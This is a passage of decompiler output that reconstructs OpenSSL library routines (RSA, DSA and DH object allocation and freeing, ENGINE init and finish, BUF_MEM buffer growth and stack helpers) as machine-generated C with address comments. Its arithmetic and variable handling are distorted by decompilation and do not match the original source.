        int64_t v6 = ENGINE_get_default_RSA(); // 0x451060
        *(int64_t *)(result + 24) = v6;
        v5 = v6;
        if (v6 == 0) {
            goto lab_0x450f36;
        } else {
            goto lab_0x450f21;
        }
    } else {
        int64_t v7 = a1;
        if ((int32_t)ENGINE_init(v7) == 0) {
            // 0x451090
            ERR_put_error(4, 106, 38, "rsa_lib.c", 159);
            CRYPTO_free(result, 106);
            // 0x451041
            return 0;
        }
        // 0x450f1d
        *(int64_t *)(result + 24) = v7;
        v5 = v7;
        goto lab_0x450f21;
    }
  lab_0x450f36:;
    int64_t v8 = FIPS_mode(); // 0x450f36
    int64_t v9 = *v4;
    int64_t v10; // 0x450ed0
    int64_t v11; // 0x450ed0
    if ((int32_t)v8 == 0) {
        goto lab_0x450f51;
    } else {
        // 0x450f43
        if ((*(char *)(v9 + 73) & 4) == 0) {
            // 0x4510c0
            ERR_put_error(4, 106, 149, "rsa_lib.c", 183);
            int64_t v12 = *(int64_t *)(result + 24); // 0x4510e1
            v11 = 106;
            v10 = v12;
            if (v12 == 0) {
                // 0x451037
                CRYPTO_free(result, 106);
                // 0x451041
                return 0;
            }
            goto lab_0x451089;
        } else {
            goto lab_0x450f51;
        }
    }
  lab_0x450f21:;
    int64_t v13 = ENGINE_get_RSA(v5); // 0x450f24
    *v4 = v13;
    if (v13 == 0) {
        // 0x451116
        ERR_put_error(4, 106, 38, "rsa_lib.c", 173);
        ENGINE_finish(*(int64_t *)(result + 24));
        CRYPTO_free(result, 106);
        // 0x451041
        return 0;
    }
    goto lab_0x450f36;
  lab_0x450f51:
    // 0x450f51
    *(int32_t *)result = 0;
    *(int32_t *)(result + 112) = 1;
    int64_t v14 = result + 96; // 0x450f5e
    *(int64_t *)(result + 8) = 0;
    *(int64_t *)(result + 32) = 0;
    *(int64_t *)(result + 40) = 0;
    *(int64_t *)(result + 48) = 0;
    *(int64_t *)(result + 56) = 0;
    *(int64_t *)(result + 64) = 0;
    *(int64_t *)(result + 72) = 0;
    *(int64_t *)(result + 80) = 0;
    *(int64_t *)(result + 88) = 0;
    *(int64_t *)(result + 120) = 0;
    *(int64_t *)(result + 128) = 0;
    *(int64_t *)(result + 136) = 0;
    *(int64_t *)(result + 152) = 0;
    *(int64_t *)(result + 160) = 0;
    *(int64_t *)(result + 144) = 0;
    *(int32_t *)(result + 116) = *(int32_t *)(v9 + 72);
    if ((int32_t)CRYPTO_new_ex_data(6, result, v14) != 0) {
        int64_t v15 = *(int64_t *)(*v4 + 56); // 0x451007
        if (v15 == 0 || (int32_t)v15 != 0) {
            // 0x451041
            return result;
        }
        int64_t v16 = *(int64_t *)(result + 24); // 0x451019
        if (v16 != 0) {
            // 0x451022
            ENGINE_finish(v16);
        }
        // 0x451027
        CRYPTO_free_ex_data(6, result, v14);
        // 0x451037
        CRYPTO_free(result, result);
        // 0x451041
        return 0;
    }
    int64_t v17 = *(int64_t *)(result + 24); // 0x451080
    v11 = result;
    v10 = v17;
    if (v17 == 0) {
        // 0x451037
        CRYPTO_free(result, result);
        // 0x451041
        return 0;
    }
    goto lab_0x451089;
  lab_0x451089:
    // 0x451089
    ENGINE_finish(v10);
    // 0x451037
    CRYPTO_free(result, v11);
    // 0x451041
    return 0;
}

// Address range: 0x451150 - 0x451157
int64_t RSA_new(int64_t a1) {
    // 0x451150
    return RSA_new_method(0);
}

// Address range: 0x451490 - 0x45155f
int64_t DSA_free(int64_t a1) {
    if (a1 == 0) {
        // 0x4514bd
        int64_t result; // 0x451490
        return result;
    }
    int64_t result2 = CRYPTO_add_lock(a1 + 96, 0xffffffff, 8, "dsa_lib.c", 194); // 0x4514b4
    if ((int32_t)result2 >= 1) {
        // 0x4514bd
        return result2;
    }
    int64_t v1 = *(int64_t *)(a1 + 128); // 0x4514d2
    if (v1 != 0) {
        // 0x4514de
        ENGINE_finish(v1);
    }
    // 0x4514e3
    CRYPTO_free_ex_data(7, a1, a1 + 104);
    int64_t v2 = *(int64_t *)(a1 + 24); // 0x4514f4
    if (v2 != 0) {
        // 0x4514fd
        BN_clear_free(v2);
    }
    int64_t v3 = *(int64_t *)(a1 + 32); // 0x451502
    if (v3 != 0) {
        // 0x45150b
        BN_clear_free(v3);
    }
    int64_t v4 = *(int64_t *)(a1 + 40); // 0x451510
    if (v4 != 0) {
        // 0x451519
        BN_clear_free(v4);
    }
    int64_t v5 = *(int64_t *)(a1 + 48); // 0x45151e
    if (v5 != 0) {
        // 0x451527
        BN_clear_free(v5);
    }
    int64_t v6 = *(int64_t *)(a1 + 56); // 0x45152c
    if (v6 != 0) {
        // 0x451535
        BN_clear_free(v6);
    }
    int64_t v7 = *(int64_t *)(a1 + 64); // 0x45153a
    if (v7 != 0) {
        // 0x451543
        BN_clear_free(v7);
    }
    int64_t v8 = *(int64_t *)(a1 + 72); // 0x451548
    if (v8 != 0) {
        // 0x451551
        BN_clear_free(v8);
    }
    // 0x451556
    return CRYPTO_free(a1, a1);
}

// Address range: 0x451560 - 0x451589
int64_t DSA_get_default_method(void) {
    int64_t result = g269; // 0x451564
    if (result != 0) {
        // 0x451570
        return result;
    }
    int64_t result2 = DSA_OpenSSL(); // 0x451578
    g269 = result2;
    return result2;
}

// Address range: 0x451590 - 0x45177a
int64_t DSA_new_method(int32_t a1) {
    // 0x451590
    int64_t v1; // 0x451590
    int64_t v2; // 0x451590
    int64_t result = CRYPTO_malloc(136, "dsa_lib.c", 123, v2, v1); // 0x4515aa
    if (result == 0) {
        // 0x451718
        ERR_put_error(10, 103, 65, "dsa_lib.c", 126);
        // 0x4516b7
        return 0;
    }
    int64_t v3 = DSA_get_default_method(); // 0x4515bb
    int64_t * v4 = (int64_t *)(result + 120); // 0x4515c3
    *v4 = v3;
    int64_t v5; // 0x451590
    int64_t v6; // 0x451590
    if (a1 == 0) {
        int64_t v7 = ENGINE_get_default_DSA(); // 0x4516c8
        *(int64_t *)(result + 128) = v7;
        v6 = v7;
        if (v7 == 0) {
            // 0x4516c8
            v5 = *v4;
            goto lab_0x4515f9;
        } else {
            goto lab_0x4515e4;
        }
    } else {
        int64_t v8 = a1;
        if ((int32_t)ENGINE_init(v8) == 0) {
            // 0x4516e8
            ERR_put_error(10, 103, 38, "dsa_lib.c", 135);
            CRYPTO_free(result, 103);
            // 0x4516b7
            return 0;
        }
        // 0x4515dd
        *(int64_t *)(result + 128) = v8;
        v6 = v8;
        goto lab_0x4515e4;
    }
  lab_0x4515e4:;
    int64_t v9 = ENGINE_get_DSA(v6); // 0x4515e7
    *v4 = v9;
    v5 = v9;
    if (v9 == 0) {
        // 0x45173e
        ERR_put_error(10, 103, 38, "dsa_lib.c", 149);
        ENGINE_finish(*(int64_t *)(result + 128));
        CRYPTO_free(result, 103);
        // 0x4516b7
        return 0;
    }
    goto lab_0x4515f9;
  lab_0x4515f9:
    // 0x4515f9
    *(int32_t *)result = 0;
    int64_t v10 = result + 104; // 0x451603
    *(int32_t *)(result + 16) = 1;
    *(int32_t *)(result + 96) = 1;
    *(int64_t *)(result + 8) = 0;
    *(int64_t *)(result + 24) = 0;
    *(int64_t *)(result + 32) = 0;
    *(int64_t *)(result + 40) = 0;
    *(int64_t *)(result + 48) = 0;
    *(int64_t *)(result + 56) = 0;
    *(int64_t *)(result + 64) = 0;
    *(int64_t *)(result + 72) = 0;
    *(int64_t *)(result + 88) = 0;
    *(int32_t *)(result + 80) = *(int32_t *)(v5 + 64) & -1025;
    CRYPTO_new_ex_data(7, result, v10);
    int64_t v11 = *(int64_t *)(*v4 + 48); // 0x45167a
    if (v11 == 0 || (int32_t)v11 != 0) {
        // 0x4516b7
        return result;
    }
    int64_t v12 = *(int64_t *)(result + 128); // 0x45168c
    if (v12 != 0) {
        // 0x451698
        ENGINE_finish(v12);
    }
    // 0x45169d
    CRYPTO_free_ex_data(7, result, v10);
    CRYPTO_free(result, result);
    // 0x4516b7
    return 0;
}

// Address range: 0x451780 - 0x451787
int64_t DSA_new(int64_t a1) {
    // 0x451780
    return DSA_new_method(0);
}

// Address range: 0x451d50 - 0x451d58
int64_t DSA_OpenSSL(void) {
    // 0x451d50
    return (int64_t)&g181;
}

// Address range: 0x452a60 - 0x452b40
int64_t DH_free(int64_t a1) {
    if (a1 == 0) {
        // 0x452a8d
        int64_t result; // 0x452a60
        return result;
    }
    int64_t result2 = CRYPTO_add_lock(a1 + 104, 0xffffffff, 26, "dh_lib.c", 184); // 0x452a84
    if ((int32_t)result2 >= 1) {
        // 0x452a8d
        return result2;
    }
    int64_t v1 = *(int64_t *)(a1 + 136); // 0x452aa5
    if (v1 != 0) {
        // 0x452ab1
        ENGINE_finish(v1);
    }
    // 0x452ab6
    CRYPTO_free_ex_data(8, a1, a1 + 112);
    int64_t v2 = *(int64_t *)(a1 + 8); // 0x452ac7
    if (v2 != 0) {
        // 0x452ad0
        BN_clear_free(v2);
    }
    int64_t v3 = *(int64_t *)(a1 + 16); // 0x452ad5
    if (v3 != 0) {
        // 0x452ade
        BN_clear_free(v3);
    }
    int64_t v4 = *(int64_t *)(a1 + 64); // 0x452ae3
    if (v4 != 0) {
        // 0x452aec
        BN_clear_free(v4);
    }
    int64_t v5 = *(int64_t *)(a1 + 72); // 0x452af1
    if (v5 != 0) {
        // 0x452afa
        BN_clear_free(v5);
    }
    int64_t v6 = *(int64_t *)(a1 + 80); // 0x452aff
    if (v6 != 0) {
        // 0x452b08
        CRYPTO_free(v6, a1);
    }
    int64_t v7 = *(int64_t *)(a1 + 96); // 0x452b0d
    if (v7 != 0) {
        // 0x452b16
        BN_clear_free(v7);
    }
    int64_t v8 = *(int64_t *)(a1 + 32); // 0x452b1b
    if (v8 != 0) {
        // 0x452b24
        BN_clear_free(v8);
    }
    int64_t v9 = *(int64_t *)(a1 + 40); // 0x452b29
    if (v9 != 0) {
        // 0x452b32
        BN_clear_free(v9);
    }
    // 0x452b37
    return CRYPTO_free(a1, a1);
}

// Address range: 0x452b40 - 0x452b69
int64_t DH_get_default_method(void) {
    int64_t result = g270; // 0x452b44
    if (result != 0) {
        // 0x452b50
        return result;
    }
    int64_t result2 = DH_OpenSSL(); // 0x452b58
    g270 = result2;
    return result2;
}

// Address range: 0x452b70 - 0x452d72
int64_t DH_new_method(int32_t a1) {
    // 0x452b70
    int64_t v1; // 0x452b70
    int64_t v2; // 0x452b70
    int64_t result = CRYPTO_malloc(144, "dh_lib.c", 117, v2, v1); // 0x452b8a
    if (result == 0) {
        // 0x452d10
        ERR_put_error(5, 105, 65, "dh_lib.c", 120);
        // 0x452cb2
        return 0;
    }
    int64_t v3 = DH_get_default_method(); // 0x452b9b
    int64_t * v4 = (int64_t *)(result + 128); // 0x452ba3
    *v4 = v3;
    int64_t v5; // 0x452b70
    int64_t v6; // 0x452b70
    if (a1 == 0) {
        int64_t v7 = ENGINE_get_default_DH(); // 0x452cc0
        *(int64_t *)(result + 136) = v7;
        v6 = v7;
        if (v7 == 0) {
            // 0x452cc0
            v5 = *v4;
            goto lab_0x452bdf;
        } else {
            goto lab_0x452bc7;
        }
    } else {
        int64_t v8 = a1;
        if ((int32_t)ENGINE_init(v8) == 0) {
            // 0x452ce0
            ERR_put_error(5, 105, 38, "dh_lib.c", 130);
            CRYPTO_free(result, 105);
            // 0x452cb2
            return 0;
        }
        // 0x452bc0
        *(int64_t *)(result + 136) = v8;
        v6 = v8;
        goto lab_0x452bc7;
    }
  lab_0x452bc7:;
    int64_t v9 = ENGINE_get_DH(v6); // 0x452bca
    *v4 = v9;
    v5 = v9;
    if (v9 == 0) {
        // 0x452d36
        ERR_put_error(5, 105, 38, "dh_lib.c", 143);
        ENGINE_finish(*(int64_t *)(result + 136));
        CRYPTO_free(result, 105);
        // 0x452cb2
        return 0;
    }
    goto lab_0x452bdf;
  lab_0x452bdf:
    // 0x452bdf
    *(int32_t *)result = 0;
    int64_t v10 = result + 112; // 0x452bec
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)(result + 88) = 0;
    *(int32_t *)(result + 104) = 1;
    *(int64_t *)(result + 8) = 0;
    *(int64_t *)(result + 16) = 0;
    *(int64_t *)(result + 24) = 0;
    *(int64_t *)(result + 32) = 0;
    *(int64_t *)(result + 40) = 0;
    *(int64_t *)(result + 64) = 0;
    *(int64_t *)(result + 72) = 0;
    *(int64_t *)(result + 80) = 0;
    *(int64_t *)(result + 96) = 0;
    *(int64_t *)(result + 56) = 0;
    *(int32_t *)(result + 48) = *(int32_t *)(v5 + 48) & -1025;
    CRYPTO_new_ex_data(8, result, v10);
    int64_t v11 = *(int64_t *)(*v4 + 32); // 0x452c75
    if (v11 == 0 || (int32_t)v11 != 0) {
        // 0x452cb2
        return result;
    }
    int64_t v12 = *(int64_t *)(result + 136); // 0x452c87
    if (v12 != 0) {
        // 0x452c93
        ENGINE_finish(v12);
    }
    // 0x452c98
    CRYPTO_free_ex_data(8, result, v10);
    CRYPTO_free(result, result);
    // 0x452cb2
    return 0;
}

// Address range: 0x452d80 - 0x452d87
int64_t DH_new(int64_t a1) {
    // 0x452d80
    return DH_new_method(0);
}

// Address range: 0x452d90 - 0x452dcd
int64_t engine_unlocked_init(int64_t a1) {
    int32_t * v1 = (int32_t *)(a1 + 176); // 0x452d90
    int64_t result2 = 1; // 0x452d9c
    if (*v1 == 0) {
        int64_t result = *(int64_t *)(a1 + 112); // 0x452d9e
        result2 = 1;
        if (result != 0) {
            // 0x452da7
            result2 = result;
            if ((int32_t)result == 0) {
                // 0x452dad
                return result;
            }
        }
    }
    int32_t * v2 = (int32_t *)(a1 + 172); // 0x452dbd
    *v2 = *v2 + 1;
    *v1 = *v1 + 1;
    return result2;
}

// Address range: 0x452dd0 - 0x452e45
int64_t ENGINE_init(int64_t a1) {
    // 0x452dd0
    if (a1 == 0) {
        // 0x452e20
        ERR_put_error(38, 119, 67, "eng_init.c", 126);
        return 0;
    }
    // 0x452dd9
    int64_t v1; // 0x452dd0
    CRYPTO_lock(9, 30, "eng_init.c", 129, v1, (int64_t)&g299);
    int64_t v2 = engine_unlocked_init(a1); // 0x452df7
    CRYPTO_lock(10, 30, "eng_init.c", 131, (int64_t)&g299, (int64_t)&g299);
    return v2 & 0xffffffff;
}

// Address range: 0x452e50 - 0x452f13
int64_t engine_unlocked_finish(int64_t a1, int64_t a2) {
    int32_t * v1 = (int32_t *)(a1 + 176); // 0x452e59
    int32_t v2 = *v1 - 1; // 0x452e5f
    *v1 = v2;
    int64_t v3 = 1; // 0x452e6a
    if (v2 == 0) {
        int64_t v4 = *(int64_t *)(a1 + 120); // 0x452e6c
        v3 = 1;
        if (v4 != 0) {
            int64_t v5 = v4; // 0x452e77
            if ((int32_t)a2 != 0) {
                // 0x452ed0
                int64_t v6; // 0x452e50
                int64_t v7; // 0x452e50
                v5 = CRYPTO_lock(10, 30, "eng_init.c", 97, v7, v6);
                CRYPTO_lock(9, 30, "eng_init.c", 100, (int64_t)&g299, (int64_t)&g299);
            }
            int64_t v8 = v5 & 0xffffffff;
            v3 = v8;
            if ((int32_t)v5 == 0) {
                // 0x452eb3
                return v8 & 0xffffffff;
            }
        }
    }
    int64_t v9 = v3; // 0x452e8e
    if ((int32_t)engine_free_util(a1, 0) == 0) {
        // 0x452e90
        ERR_put_error(38, 191, 106, "eng_init.c", 114);
        v9 = 0;
    }
    // 0x452eb3
    return v9 & 0xffffffff;
}

// Address range: 0x452f20 - 0x452fc5
int64_t ENGINE_finish(int64_t a1) {
    // 0x452f20
    if (a1 == 0) {
        // 0x452fa0
        ERR_put_error(38, 107, 67, "eng_init.c", 142);
        return 0;
    }
    // 0x452f29
    int64_t v1; // 0x452f20
    CRYPTO_lock(9, 30, "eng_init.c", 145, v1, (int64_t)&g299);
    int64_t v2 = engine_unlocked_finish(a1, 1); // 0x452f4c
    CRYPTO_lock(10, 30, "eng_init.c", 147, (int64_t)&g299, (int64_t)&g299);
    if ((int32_t)v2 == 0) {
        // 0x452f72
        ERR_put_error(38, 107, 106, "eng_init.c", 150);
    }
    // 0x452f93
    return v2 & 0xffffffff;
}

// Address range: 0x452fd0 - 0x452fd5
int64_t ENGINE_get_RSA(int64_t a1) {
    // 0x452fd0
    return *(int64_t *)(a1 + 16);
}

// Address range: 0x452ff0 - 0x453001
int64_t ENGINE_get_default_RSA(void) {
    // 0x452ff0
    return engine_table_select(&g271, 1);
}

// Address range: 0x4530e0 - 0x4530e5
int64_t ENGINE_get_DSA(int64_t a1) {
    // 0x4530e0
    return *(int64_t *)(a1 + 24);
}

// Address range: 0x453100 - 0x453111
int64_t ENGINE_get_default_DSA(void) {
    // 0x453100
    return engine_table_select(&g272, 1);
}

// Address range: 0x4531f0 - 0x4531f5
int64_t ENGINE_get_DH(int64_t a1) {
    // 0x4531f0
    return *(int64_t *)(a1 + 32);
}

// Address range: 0x453210 - 0x453221
int64_t ENGINE_get_default_DH(void) {
    // 0x453210
    return engine_table_select(&g273, 1);
}

// Address range: 0x453470 - 0x4534d8
int64_t BUF_MEM_new(void) {
    // 0x453470
    int64_t v1; // 0x453470
    int64_t v2; // 0x453470
    int64_t result = CRYPTO_malloc(24, "buffer.c", 72, v2, v1); // 0x453485
    if (result == 0) {
        // 0x4534ab
        ERR_put_error(7, 101, 65, "buffer.c", 75);
    } else {
        // 0x45348f
        *(int64_t *)result = 0;
        *(int64_t *)(result + 16) = 0;
        *(int64_t *)(result + 8) = 0;
    }
    // 0x4534a6
    return result;
}

// Address range: 0x4534e0 - 0x453619
int64_t BUF_MEM_grow_clean(uint64_t a1, uint64_t a2) {
    // 0x4534e0
    int64_t v1; // 0x4534e0
    int64_t v2; // 0x4534e0
    if (a1 >= a2) {
        // 0x4535d0
        v1 = a2;
        v2 = a1 - a2;
    } else {
        int64_t * v3 = (int64_t *)(a1 + 16); // 0x453505
        uint64_t v4 = *v3; // 0x453505
        if (v4 < a2) {
            // 0x453512
            if (a2 >= 0x5ffffffd) {
                // 0x4535ae
                ERR_put_error(7, 105, 65, "buffer.c", 159);
                // 0x45358e
                return 0;
            }
            int64_t * v5 = (int64_t *)(a1 + 8); // 0x453533
            int64_t v6 = *v5; // 0x453533
            uint64_t v7 = (a2 + 3) / 0xc0000000;
            int64_t v8 = v7 & 0xfffffffc;
            int64_t v9; // 0x4534e0
            int64_t v10; // 0x4534e0
            if (v6 == 0) {
                // 0x453600
                int64_t v11; // 0x4534e0
                int64_t v12 = CRYPTO_malloc(v8, "buffer.c", 164, v11, 159); // 0x45360f
                v9 = v8;
                v10 = v12;
            } else {
                // 0x453551
                int64_t v13; // 0x4534e0
                int64_t v14 = CRYPTO_realloc_clean(v6, v4, v8, "buffer.c", 166, v13); // 0x453561
                v9 = v6;
                v10 = v14;
            }
            // 0x453566
            if (v10 == 0) {
                // 0x4535ae
                ERR_put_error(7, 105, 65, "buffer.c", 169);
                // 0x45358e
                return 0;
            }
            int64_t v15 = v9;
            *v5 = v10;
            *v3 = v7 & 0x1fffffffc;
            memset((int64_t *)(v10 + v15), 0, (int32_t)(a2 - v15));
            *(int64_t *)a1 = a2;
            // 0x45358e
            return a2 & 0xffffffff;
        }
        // 0x4535f0
        v1 = a1;
        v2 = a2 - a1;
    }
    int64_t v16 = *(int64_t *)(a1 + 8); // 0x4535d9
    memset((int64_t *)(v16 + v1), 0, (int32_t)v2);
    *(int64_t *)a1 = a2;
    // 0x45358e
    return a2 & 0xffffffff;
}

// Address range: 0x453620 - 0x453741
int64_t BUF_MEM_grow(uint64_t a1, uint64_t a2) {
    // 0x453620
    if (a2 <= a1) {
        // 0x4536c0
        *(int64_t *)a1 = a2;
        // 0x4536c6
        return a2 & 0xffffffff;
    }
    int64_t * v1 = (int64_t *)(a1 + 16); // 0x453641
    if (*v1 >= a2) {
        // 0x4536e0
        memset((int64_t *)(*(int64_t *)(a1 + 8) + a1), 0, (int32_t)(a2 - a1));
        *(int64_t *)a1 = a2;
        // 0x4536c6
        return a2 & 0xffffffff;
    }
    // 0x45364b
    if (a2 >= 0x5ffffffd) {
        // 0x453706
        ERR_put_error(7, 100, 65, "buffer.c", 116);
        // 0x4536c6
        return 0;
    }
    int64_t * v2 = (int64_t *)(a1 + 8); // 0x45366c
    int64_t v3 = *v2; // 0x45366c
    uint64_t v4 = (a2 + 3) / 0xc0000000;
    int64_t v5 = v4 & 0xfffffffc;
    int64_t v6; // 0x453620
    int64_t v7; // 0x453620
    if (v3 == 0) {
        // 0x453728
        int64_t v8; // 0x453620
        int64_t v9 = CRYPTO_malloc(v5, "buffer.c", 121, v8, 116); // 0x453737
        v6 = v5;
        v7 = v9;
    } else {
        // 0x45368a
        int64_t v10; // 0x453620
        int64_t v11 = CRYPTO_realloc(v3, v5, "buffer.c", 123, 116, v10); // 0x453699
        v6 = v3;
        v7 = v11;
    }
    // 0x45369e
    if (v7 == 0) {
        // 0x453706
        ERR_put_error(7, 100, 65, "buffer.c", 126);
        // 0x4536c6
        return 0;
    }
    int64_t v12 = v6;
    *v2 = v7;
    *v1 = v4 & 0x1fffffffc;
    memset((int64_t *)(v7 + v12), 0, (int32_t)(a2 - v12));
    // 0x4536c0
    *(int64_t *)a1 = a2;
    // 0x4536c6
    return a2 & 0xffffffff;
}

// Address range: 0x453750 - 0x453782
int64_t BUF_MEM_free(int64_t a1, int64_t a2) {
    // 0x453750
    if (a1 == 0) {
        // 0x453780
        int64_t result; // 0x453750
        return result;
    }
    int64_t * v1 = (int64_t *)(a1 + 8); // 0x453759
    int64_t v2 = *v1; // 0x453759
    int64_t v3 = a2; // 0x453760
    if (v2 != 0) {
        // 0x453762
        memset((int64_t *)v2, 0, *(int32_t *)(a1 + 16));
        CRYPTO_free(*v1, 0);
        v3 = 0;
    }
    // 0x453775
    return CRYPTO_free(a1, v3);
}

// Address range: 0x455800 - 0x455835
int64_t BIO_snprintf(int64_t a1, int64_t a2, char * a3, int64_t a4, int64_t a5, int64_t a6) {
    // 0x455800
    int64_t v1; // 0x455800
    return 0x455855 - (4 * v1 & 1020);
}

// Address range: 0x455b60 - 0x455b6e
int64_t sk_num(int64_t a1) {
    // 0x455b60
    int64_t v1; // 0x455b60
    return a1 == 0 ? 0xffffffff : v1 & 0xffffffff;
}

// Address range: 0x455b70 - 0x455b95
int64_t sk_value(int64_t a1, int64_t a2) {
    int32_t v1 = a2; // 0x455b70
    if ((int32_t)a1 > v1 == a1 != 0 == v1 > -1) {
        // 0x455b89
        return *(int64_t *)(*(int64_t *)(a1 + 8) + 0x100000000 * a2 / 0x20000000);
    }
    // 0x455b74
    return 0;
}

// Address range: 0x455ba0 - 0x455bc8
int64_t sk_set(int64_t a1, int64_t a2, int64_t result) {
    int32_t v1 = a2; // 0x455ba0
    if ((int32_t)a1 > v1 != (a1 != 0 == v1 > -1)) {
        // 0x455ba4
        return 0;
    }
    // 0x455bb9
    *(int64_t *)(*(int64_t *)(a1 + 8) + 0x100000000 * a2 / 0x20000000) = result;
    return result;
}

// Address range: 0x455be0 - 0x455c16
int64_t sk_sort(int64_t nmemb) {
    // 0x455be0
    int64_t result; // 0x455be0
    if (nmemb == 0) {
        // 0x455bf0
        return result;
    }
    int32_t * v1 = (int32_t *)(nmemb + 16);
    if (*v1 != 0) {
        // 0x455bf0
        return result;
    }
    int64_t v2 = *(int64_t *)(nmemb + 24); // 0x455bfb
    int64_t base = *(int64_t *)(nmemb + 8); // 0x455c04
    qsort((int64_t *)base, (int32_t)nmemb, 8, (int32_t (*)(int64_t *, int64_t *))v2);
    *v1 = 1;
    return &g299;
}

// Address range: 0x455c20 - 0x455c42
int64_t sk_free(int64_t a1) {
    // 0x455c20
    if (a1 == 0) {
        // 0x455c40
        int64_t result; // 0x455c20
        return result;
    }
    int64_t v1 = *(int64_t *)(a1 + 8); // 0x455c29
    int64_t v2; // 0x455c20
    if (v1 != 0) {
        // 0x455c32
        CRYPTO_free(v1, v2);
    }
    // 0x455c37
    return CRYPTO_free(a1, v2);
}

// Address range: 0x455c50 - 0x455cab
int64_t sk_pop_free(int64_t a1, int64_t a2) {
    // 0x455c50
    if (a1 == 0) {
        // 0x455ca0
        int64_t result; // 0x455c50
        return result;
    }
    int64_t v1; // 0x455c50
    if ((int32_t)v1 < 1) {
        // 0x455c8b
        return sk_free(a1);
    }
    int64_t v2 = 0; // 0x455c80
    while ((v2 + 1 & 0xffffffff) < 0x100000000 * v1 / 0x100000000) {
        // 0x455c70
        v2 = v2 + 1 & 0xffffffff;
    }
    // 0x455c8b
    return sk_free(a1);
}

// Address range: 0x455ce0 - 0x455d7b
int64_t internal_find(int64_t a1, int64_t a2, int64_t a3) {
    int64_t v1 = a2; // bp-32, 0x455cee
    if (a1 == 0) {
        // 0x455d0e
        return 0xffffffff;
    }
    int64_t * v2 = (int64_t *)(a1 + 24);
    int64_t result; // 0x455ce0
    if (*v2 != 0) {
        // 0x455cfc
        sk_sort(a1);
        if (a2 == 0) {
            // 0x455d0e
            return 0xffffffff;
        }
        int64_t * v3 = (int64_t *)(a1 + 8); // 0x455d50
        int64_t v4 = *v3; // 0x455d50
        int64_t v5 = *v2; // 0x455d54
        int64_t v6 = OBJ_bsearch_ex_((int64_t)&v1, v4, a1 & 0xffffffff, 8, v5, (int32_t)a3); // 0x455d67
        result = 0xffffffff;
        if (v6 != 0) {
            // 0x455d71
            result = (v6 - *v3) / 8;
        }
        // 0x455d0e
        return result;
    }
    // 0x455d18
    if ((int32_t)a1 < 1) {
        // 0x455d0e
        return 0xffffffff;
    }
    int64_t v7 = *(int64_t *)(a1 + 8); // 0x455d1e
    int64_t v8 = 0; // 0x455d2c
    if (*(int64_t *)v7 == a2) {
        // 0x455d0e
        return 0;
    }
    int64_t v9 = v7; // 0x455d2c
    v8 = v8 + 1 & 0xffffffff;
    result = 0xffffffff;
    while (v8 < (a1 & 0xffffffff)) {
        // 0x455d30
        v9 += 8;
        result = v8;
        if (*(int64_t *)v9 == a2) {
            // break -> 0x455d0e
            break;
        }
        v8 = v8 + 1 & 0xffffffff;
        result = 0xffffffff;
    }
    // 0x455d0e
    return result;
}

// Address range: 0x455d90 - 0x455d9a
int64_t sk_find(int64_t a1, int32_t a2, int64_t a3, int64_t a4) {
    // 0x455d90
    return internal_find(a1, (int64_t)a2, 2);
}

// Address range: 0x455da0 - 0x455e47
int64_t sk_insert(int64_t a1, int64_t a2, uint32_t a3) {
    // 0x455da0
    if (a1 == 0) {
        // 0x455e40
        return 0;
    }
    int32_t * v1 = (int32_t *)(a1 + 20);
    uint32_t v2 = *v1; // 0x455db5
    int64_t * v3 = (int64_t *)(a1 + 8);
    int64_t v4 = *v3;
    int64_t v5 = v4; // 0x455dc1
    if (v2 <= (int32_t)a1 + 1) {
        // 0x455e10
        int64_t v6; // 0x455da0
        int64_t v7; // 0x455da0
        v5 = CRYPTO_realloc(v4, 16 * (int64_t)v2 & 0xfffffff0, "stack.c", 150, v7, v6);
        if (v5 == 0) {
            // 0x455e40
            return 0;
        }
        // 0x455e2d
        *v3 = v5;
        *v1 = 2 * *v1;
    }
    uint64_t v8 = (int64_t)a3; // 0x455da9
    int64_t v9 = a1 & 0xffffffff;
    int64_t v10 = v5 + 0x100000000 * a1 / 0x20000000;
    int64_t v11 = v9; // 0x455dc9
    int64_t v12; // 0x455ddd
    if (v9 > v8 != a3 >= 0) {
        // 0x455dd6
        *(int64_t *)v10 = a2;
        // 0x455ddd
        v12 = v9 + 1;
        *(int32_t *)(a1 + 16) = 0;
        *(int32_t *)a1 = (int32_t)v12;
        return v12 & 0xffffffff;
    }
    int64_t v13 = v10;
    v11 = v11 + 0xffffffff & 0xffffffff;
    *(int64_t *)(v13 + 8) = *(int64_t *)v13;
    int64_t v14 = v13 - 8; // 0x455e00
    while (v11 >= v8) {
        // 0x455df0
        v13 = v14;
        v11 = v11 + 0xffffffff & 0xffffffff;
        *(int64_t *)(v13 + 8) = *(int64_t *)v13;
        v14 = v13 - 8;
    }
    // 0x455e02
    *(int64_t *)(*v3 + 0x100000000 * v8 / 0x20000000) = a2;
    // 0x455ddd
    v12 = v9 + 1;
    *(int32_t *)(a1 + 16) = 0;
    *(int32_t *)a1 = (int32_t)v12;
    return v12 & 0xffffffff;
}

// Address range: 0x455e60 - 0x455e67
int64_t sk_push(int64_t a1, int64_t a2, int64_t a3, int64_t a4) {
    // 0x455e60
    int64_t v1; // 0x455e60
    return sk_insert(a1, a2, (int32_t)v1);
}

// Address range: 0x455e70 - 0x455f0c
int64_t sk_new(int32_t a1) {
    // 0x455e70
    int64_t v1; // 0x455e70
    int64_t v2; // 0x455e70
    int64_t v3 = CRYPTO_malloc(32, "stack.c", 125, v2, v1); // 0x455e8a
    if (v3 == 0) {
        // 0x455eed
        return 0;
    }
    int64_t v4 = CRYPTO_malloc(32, "stack.c", 127, v2, v1); // 0x455ea8
    *(int64_t *)(v3 + 8) = v4;
    int64_t result; // 0x455e70
    if (v4 == 0) {
        // 0x455f00
        CRYPTO_free(v3, (int64_t)"stack.c");
        result = 0;
    } else {
        // 0x455eb6
        *(int64_t *)v4 = 0;
        *(int64_t *)(v4 + 8) = 0;
        *(int64_t *)(v4 + 16) = 0;
        *(int64_t *)(v4 + 24) = 0;
        *(int64_t *)(v3 + 24) = (int64_t)a1;
        *(int32_t *)(v3 + 20) = 4;
        *(int32_t *)v3 = 0;
        *(int32_t *)(v3 + 16) = 0;
        result = v3;
    }
    // 0x455eed
    return result;
}

// Address range: 0x455f10 - 0x455f17
int64_t sk_new_null(int64_t a1) {
    // 0x455f10
    return sk_new(0);
}

// Address range: 0x455fb0 - 0x45604b
int64_t doall_util_fn(int64_t a1, int32_t a2, int64_t a3, int32_t a4, int32_t a5) {
    int64_t result; // 0x455fb0
    if (a1 == 0) {
        // 0x45603c
        return result;
    }
    int32_t v1 = *(int32_t *)(a1 + 24) - 1; // 0x455fd4
